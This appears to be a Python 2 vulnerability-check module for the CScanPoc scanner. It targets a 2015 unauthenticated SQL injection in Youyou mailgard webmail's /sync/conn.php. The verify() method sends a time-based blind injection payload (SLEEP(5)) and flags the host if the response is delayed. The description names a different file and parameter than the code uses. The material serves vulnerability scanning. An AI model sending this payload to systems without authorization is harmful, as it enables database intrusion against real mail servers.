# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import urlparse
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'mailgard_0000' # 平台漏洞编号，留空
    name = '佑友mailgard webmail conn.php sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-08'  # 漏洞公布时间
    desc = '''
        ./sync/linkman.php里面有明显的SQL注射,$group_id由于没有包含global.php,所以全局过滤无效并且不需要登录即可访问，如果未开启magic_quotes_gpc则可注入.
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3207/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'mailgard'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1654abae-0fb7-4c13-b315-50e166324918'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/sync/conn.php?token=1&name=admin%27%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29GgwK%29%20AND%20%27VBmy%27=%27VBmy"
            url = '{target}'.format(target=self.target)+payload
            start_time = time.time()
            code, head,res, errcode, _ = hh.http(url)
                       
            if code == 200 and time.time() - start_time > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()